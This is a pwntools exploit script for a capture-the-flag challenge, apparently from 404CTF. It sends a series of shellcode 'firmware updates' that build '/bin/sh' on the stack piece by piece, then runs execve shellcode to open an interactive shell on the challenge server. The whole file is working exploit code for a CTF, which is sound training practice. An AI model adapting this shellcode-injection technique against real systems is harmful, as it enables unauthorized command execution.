from pwn import *

exe = ELF(b'chall')

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        return r
    else:
        return remote('challenges.404ctf.fr', 32466)

def pushshell(v: bytes, offset = 0):
    o = str(hex(offset))
    print("char", v, "at position: ", o)

    shellcode_asm = f"""
        mov rax, {hex(int.from_bytes(v))}
        mov [rsp-{o}], rax
        ret
	"""
    shellcode = asm(shellcode_asm, bits=64)
    print(f"shellcode length : {len(shellcode)} bytes")
    return shellcode

def shellcode(offset):
    shellcode_asm = f"""
        lea rdi, [rsp-{str(hex(offset))}]
        xor rsi, rsi
        cdq
        mov al, 59
        syscall
	"""
    shellcode = asm(shellcode_asm, bits=64)
    print(f"shellcode length : {len(shellcode)} bytes")
    return shellcode

def main():
    global r 

    r = conn()
    pause()

    basersp = 0x38
    for i, c in enumerate("/bin/sh"):
        # 1 Send the firmware
        r.recvuntil(b"Enter your choice")
        r.sendline(b'1')
        r.recvuntil(b"Ready to receive update")
        code = pushshell(c.encode(), offset=basersp-i)
        print("Sending: ", code)
        r.sendline(code)

        # 2. Run le firmware et execute l'update qui met /bin/sh sur la stack
        r.recvuntil(b"Enter your choice")
        r.sendline(b'2')


    # 3. Send a new firmaware
    r.recvuntil(b"Enter your choice")
    r.sendline(b'1')
    r.recvuntil(b"Ready to receive update")
    code = shellcode(basersp)
    r.sendline(code)


    # 4. Run le firmware et execute l'update qui met /bin/sh sur la stack
    r.recvuntil(b"Enter your choice")
    r.sendline(b'2')


    r.interactive()

if __name__ == '__main__':
    main()
